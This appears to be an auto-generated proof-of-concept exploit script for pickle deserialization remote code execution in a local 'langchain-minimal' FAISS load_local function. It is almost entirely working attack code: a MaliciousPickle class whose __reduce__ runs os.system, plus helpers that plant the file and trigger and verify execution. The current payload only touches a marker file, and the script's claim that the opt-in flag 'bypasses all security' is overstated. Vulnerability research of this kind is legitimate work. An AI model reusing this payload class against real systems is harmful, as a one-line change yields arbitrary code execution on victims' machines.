#!/usr/bin/env python3
# PoC for langchain-minimal (/tmp/langchain-minimal)
# Path: rce-001
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-minimal pickle deserialization RCE.

Vulnerability: The load_local function in FAISS vectorstore uses pickle.load()
on a file constructed from user-controlled folder_path and index_name.
The allow_dangerous_deserialization flag is a simple boolean check that
does NOT validate the data source - any caller setting it to True bypasses
all security. An attacker who can control the folder_path or the contents
of the .pkl file can achieve arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Calling load_local with the malicious file path
3. Showing that arbitrary code execution occurs

Usage: python3 poc_langchain_rce.py [--target /tmp/malicious_folder]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
from pathlib import Path

# Add the langchain-minimal path to sys.path for importing
sys.path.insert(0, "/tmp/langchain-minimal")

# Benign payload - creates a marker file to prove code execution
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"


class MaliciousPickle:
    """
    A class that executes arbitrary code when unpickled.
    This demonstrates the pickle deserialization vulnerability.
    """
    def __reduce__(self):
        # Return a tuple (callable, args) that pickle will execute
        return (os.system, (BENIGN_PAYLOAD,))


def create_malicious_pickle(output_path: str) -> str:
    """
    Creates a malicious pickle file that executes a benign command.
    
    Args:
        output_path: Directory where the pickle file will be created
    
    Returns:
        Path to the created pickle file
    """
    # Create the directory if it doesn't exist
    Path(output_path).mkdir(parents=True, exist_ok=True)
    
    # Create a malicious pickle that will execute our payload
    # The pickle contains a tuple (docstore, index_to_docstore_id)
    # where docstore is our malicious object
    malicious_data = (MaliciousPickle(), {})
    
    pickle_path = os.path.join(output_path, "index.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(malicious_data, f)
    
    print(f"[+] Created malicious pickle file: {pickle_path}")
    return pickle_path


def create_dummy_faiss_index(output_path: str) -> str:
    """
    Creates a dummy FAISS index file to satisfy the load_local function.
    The function also loads a .faiss file, so we need a minimal valid one.
    
    Args:
        output_path: Directory where the FAISS file will be created
    
    Returns:
        Path to the created FAISS file
    """
    faiss_path = os.path.join(output_path, "index.faiss")
    
    # Create a minimal FAISS index file
    # This is just a placeholder - the actual exploit is in the pickle
    with open(faiss_path, "wb") as f:
        # Write a minimal FAISS index header
        f.write(b"\x00" * 100)
    
    print(f"[+] Created dummy FAISS index file: {faiss_path}")
    return faiss_path


def attempt_exploit(target_folder: str) -> bool:
    """
    Attempts to trigger the RCE by calling load_local with malicious files.
    
    Args:
        target_folder: Path to folder containing malicious pickle
    
    Returns:
        True if exploit succeeded, False otherwise
    """
    try:
        # Import the vulnerable function
        from langchain_community.vectorstores.faiss import FAISS
        
        # We need embeddings - use a simple mock
        class MockEmbeddings:
            def embed_query(self, text):
                return [0.0] * 384  # Return dummy embedding
        
        embeddings = MockEmbeddings()
        
        print(f"[*] Attempting to trigger RCE via load_local...")
        print(f"[*] Target folder: {target_folder}")
        print(f"[*] Payload: {BENIGN_PAYLOAD}")
        
        # Call the vulnerable function with allow_dangerous_deserialization=True
        # This bypasses the only guard and triggers pickle.load()
        result = FAISS.load_local(
            folder_path=target_folder,
            embeddings=embeddings,
            index_name="index",
            allow_dangerous_deserialization=True
        )
        
        print(f"[+] load_local completed (unexpectedly)")
        return True
        
    except Exception as e:
        print(f"[!] Exception during load_local: {e}")
        # The exploit may still have executed even if load_local fails
        # Check if our payload was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] Payload was executed despite exception!")
            return True
        return False


def verify_exploit() -> bool:
    """
    Verifies if the exploit payload was executed.
    
    Returns:
        True if the marker file exists, False otherwise
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file created: {marker_file}")
        print(f"[+] Arbitrary code execution achieved via pickle deserialization")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Exploit did not execute - marker file not found")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-minimal pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=tempfile.mkdtemp(prefix="langchain_poc_"),
        help="Directory to create malicious files in (default: temp dir)"
    )
    args = parser.parse_args()
    
    target_folder = args.target
    
    print("=" * 60)
    print("langchain-minimal Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Step 1: Create malicious pickle file
    print("[*] Step 1: Creating malicious pickle file...")
    pickle_path = create_malicious_pickle(target_folder)
    
    # Step 2: Create dummy FAISS index file
    print("[*] Step 2: Creating dummy FAISS index file...")
    faiss_path = create_dummy_faiss_index(target_folder)
    
    # Step 3: Attempt to trigger the exploit
    print()
    print("[*] Step 3: Attempting to trigger RCE...")
    exploit_attempted = attempt_exploit(target_folder)
    
    # Step 4: Verify exploit success
    print()
    print("[*] Step 4: Verifying exploit...")
    exploit_success = verify_exploit()
    
    print()
    if exploit_success:
        print("[+] VULNERABILITY CONFIRMED: RCE via pickle deserialization")
        print("[+] The allow_dangerous_deserialization flag does NOT protect")
        print("[+] against malicious pickle files - it only requires the")
        print("[+] caller to set it to True, which any attacker can do.")
        sys.exit(0)
    else:
        print("[-] Exploit verification failed")
        print("[*] Note: This may be due to missing dependencies or")
        print("[*] changes in the target environment.")
        sys.exit(1)


if __name__ == "__main__":
    main()
